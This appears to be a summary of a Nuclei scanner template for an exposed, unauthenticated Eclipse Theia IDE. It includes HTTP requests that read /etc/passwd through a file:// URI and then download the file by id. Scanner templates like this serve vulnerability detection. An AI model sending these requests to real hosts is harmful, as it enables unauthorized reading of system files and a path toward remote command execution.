# Nuclei Template: Eclipse Theia IDE - LFI to RCE
**Template ID:** theia-lfi-to-rce
**Vulnerability Class:** Path Traversal
**Severity:** Critical
**Source:** Nuclei Template (`theia-lfi-to-rce.yaml`)

## Vulnerability Information & PoC

## Description
Detected Eclipse Theia IDE was exposed without authentication, allowing unauthenticated attackers to access the web-based IDE with terminal capabilities, file system access, and arbitrary command execution.

## Steps to reproduce / Exploit Payload
```http
GET /files/?uri=file:///etc/passwd HTTP/1.1
Host: {{Hostname}}

GET /files/download/?id={{file_id}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://theia-ide.org/
